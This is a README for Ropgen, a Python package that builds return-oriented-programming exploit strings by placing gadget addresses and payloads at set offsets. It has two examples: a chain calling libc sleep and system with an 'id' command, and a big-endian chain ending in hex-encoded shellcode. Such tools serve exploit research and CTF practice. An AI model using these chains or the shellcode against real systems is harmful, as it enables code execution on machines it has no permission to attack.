# Ropgen

A python module to facilitate in the generation of ROP chain exploit strings.

After we have found out the gadgets which will be used in the ROP chain we need to lay out them. The gadgets needs be placed at specific offsets within the exploit string with filler bytes separating them.

This python module assists in the creation of such ROP strings. You can build the string by specifying the offsets and the value that will be placed at that offset. A value can be a byte, word, double word, quad word or string.

Additionally, you can summarize the generated rop string in the form of a nice ascii table.

# Installation

Ropgen is available on PyPI. 

[![PyPI version](https://badge.fury.io/py/ropgen.svg)](https://badge.fury.io/py/ropgen)

To install systemwide (requires root privileges)

```
# pip install ropgen
```

Or to do a local install to the user home directory (doesn't require root)

```
$ pip install --user ropgen
```

## Example-1

```python
#!/usr/bin/env python2
from ropgen import RopGen

libc = 0x2ab3e000
gadget1 = 0x27eb4
sleep = 0x2f2b0
system = 0x2bfd0
gadget2 = 0x267b0
gadget3 = 0x171cc

# endianess is le by default
rop = RopGen()
rop.set_dword(51, libc + gadget1, "Gadget 1")
rop.set_dword(158, libc + sleep, "sleep")
rop.set_dword(170, libc + system, "system")
rop.set_dword(194, libc + gadget2, "Gadget 2")
rop.set_dword(226, libc + gadget3, "Gadget 3")
rop.set_string(254, "id; \x00", "Payload")

print rop.build()
print rop.summarize()
```

**Output**

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�^�*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�Ҷ*AAAAAAAAП�*AAAAAAAAAAAAAAAAAAAA�G�*AAAAAAAAAAAAAAAAAAAAAAAAAAAA�Q�*AAAAAAAAAAAAAAAAAAAAAAAAid; 
+--------+---------------------+-----------------+
| Offset | Content description | Length in bytes |
+========+=====================+=================+
| 0      | Padding Bytes       |       51        |
+--------+---------------------+-----------------+
| 51     | Gadget 1            |        4        |
+--------+---------------------+-----------------+
| 55     | Padding Bytes       |       103       |
+--------+---------------------+-----------------+
| 158    | sleep               |        4        |
+--------+---------------------+-----------------+
| 162    | Padding Bytes       |        8        |
+--------+---------------------+-----------------+
| 170    | system              |        4        |
+--------+---------------------+-----------------+
| 174    | Padding Bytes       |       20        |
+--------+---------------------+-----------------+
| 194    | Gadget 2            |        4        |
+--------+---------------------+-----------------+
| 198    | Padding Bytes       |       28        |
+--------+---------------------+-----------------+
| 226    | Gadget 3            |        4        |
+--------+---------------------+-----------------+
| 230    | Padding Bytes       |       24        |
+--------+---------------------+-----------------+
| 254    | Payload             |        5        |
+--------+---------------------+-----------------+
```

## Example-2

```python
#!/usr/bin/env python3
from ropgen import RopGen

libc = 0x40854000
gadget1 = libc + 0x000158dc
gadget2 = libc + 0x00037690
gadget3 = libc + 0x0000b830
gadget4 = libc + 0x00040e18 + 4
sleep = libc + 0x56bd0

shell = bytes.fromhex('6269093c2f2f2935f4ffa9af7368093c6'\
	'e2f2935f8ffa9affcffa0aff4ffbd2720'\
	'20a003fcffa0affcffbd27ffff0628fcf'\
	'fa6affcffbd232030a00373680934fcff'\
	'a9affcffbd27ffff0528fcffa5affcffb'\
	'd23fbff1924272820032028bd00fcffa5'\
	'affcffbd232028a003ab0f02340c010101')

rop = RopGen(endian='be', padding='B')
rop.set_dword(260, sleep, "sleep")
rop.set_dword(276, gadget2, "gadget2")
rop.set_dword(292, gadget1 , "gadget1")
rop.set_dword(296 + 0x24, gadget3, "gadget3")
rop.set_dword(296 + 0x20, gadget4, "gadget4")
rop.set_string(296 + 0x28 + 0xb8, shell, "shellcode")
rop.build()
print(rop.summarize())
```
**Output**

```
+--------+---------------------+-----------------+
| Offset | Content description | Length in bytes |
+========+=====================+=================+
| 0      | Padding Bytes       |       260       |
+--------+---------------------+-----------------+
| 260    | sleep               |        4        |
+--------+---------------------+-----------------+
| 264    | Padding Bytes       |       12        |
+--------+---------------------+-----------------+
| 276    | gadget2             |        4        |
+--------+---------------------+-----------------+
| 280    | Padding Bytes       |       12        |
+--------+---------------------+-----------------+
| 292    | gadget1             |        4        |
+--------+---------------------+-----------------+
| 296    | Padding Bytes       |       32        |
+--------+---------------------+-----------------+
| 328    | gadget4             |        4        |
+--------+---------------------+-----------------+
| 332    | gadget3             |        4        |
+--------+---------------------+-----------------+
| 336    | Padding Bytes       |       184       |
+--------+---------------------+-----------------+
| 520    | shellcode           |       116       |
+--------+---------------------+-----------------+
```

# License

Licensed under MIT.
